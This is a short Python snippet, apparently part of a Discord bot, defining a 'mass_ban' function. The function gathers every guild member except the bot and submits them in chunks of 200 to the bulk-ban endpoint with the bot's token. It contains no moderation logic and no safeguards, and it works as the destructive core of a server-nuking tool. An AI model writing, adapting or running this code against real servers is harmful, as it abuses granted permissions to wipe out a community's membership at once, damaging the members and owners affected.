async def mass_ban(bot, guild):
    members = [m for m in guild.members if m.id != guild.me.id]
    chunked = [members[i:i+200] for i in range(0, len(members), 200)]
    for chunk in chunked:
        payload = {"user_ids": [str(m.id) for m in chunk]}
        await bot.http_pool.request(bot.own_token, "POST", f"/guilds/{guild.id}/bulk-ban", json=payload)
